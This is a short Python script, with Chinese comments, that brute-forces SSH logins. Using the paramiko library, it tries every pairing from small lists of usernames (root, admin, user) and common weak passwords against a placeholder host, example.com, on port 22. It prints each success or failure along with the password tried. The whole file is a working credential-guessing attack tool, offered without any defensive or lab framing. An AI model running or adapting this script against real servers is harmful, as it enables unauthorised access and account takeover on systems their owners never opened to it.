import paramiko


# SSH连接函数
def ssh_connect(hostname, port, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(hostname, port, username, password)
        print(f"成功登录：{username}@{hostname}:{port}，密码：{password}")
    except paramiko.AuthenticationException:
        print(f"登录失败：{username}@{hostname}:{port}，密码：{password}")
    finally:
        ssh.close()


# 爆破函数
def ssh_brute_force(hostname, port, username_list, password_list):
    for username in username_list:
        for password in password_list:
            ssh_connect(hostname, port, username, password)


# 测试
hostname = "example.com"
port = 22
username_list = ["root", "admin", "user"]
password_list = ["password", "123456", "admin123"]

ssh_brute_force(hostname, port, username_list, password_list)
